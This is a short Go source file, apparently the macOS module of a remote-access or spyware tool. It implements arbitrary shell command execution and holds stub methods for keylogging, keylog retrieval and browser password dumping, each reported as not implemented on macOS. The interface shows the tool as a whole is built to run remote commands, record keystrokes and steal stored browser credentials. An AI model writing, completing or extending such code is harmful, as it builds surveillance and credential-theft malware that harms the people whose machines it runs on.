//go:build darwin

package darwin

import (
	"os/exec"
)

// DarwinPlatform represents the macOS platform.
type DarwinPlatform struct{}

// NewPlatform returns a new instance of the DarwinPlatform.
func NewPlatform() *DarwinPlatform {
	return &DarwinPlatform{}
}

// ExecuteCommand executes a command on macOS.
func (p *DarwinPlatform) ExecuteCommand(command string) ([]byte, error) {
	cmd := exec.Command("sh", "-c", command)
	return cmd.CombinedOutput()
}

// Init does nothing on macOS.
func (p *DarwinPlatform) Init() error {
	return nil
}

// StartKeylogger does nothing on macOS.
func (p *DarwinPlatform) StartKeylogger() {}

// GetKeylogs does nothing on macOS.
func (p *DarwinPlatform) GetKeylogs() string {
	return "Keylogger not implemented for macOS."
}

// DumpBrowsers does nothing on macOS.
func (p *DarwinPlatform) DumpBrowsers() string {
	return "Browser password dumping not implemented for macOS."
}
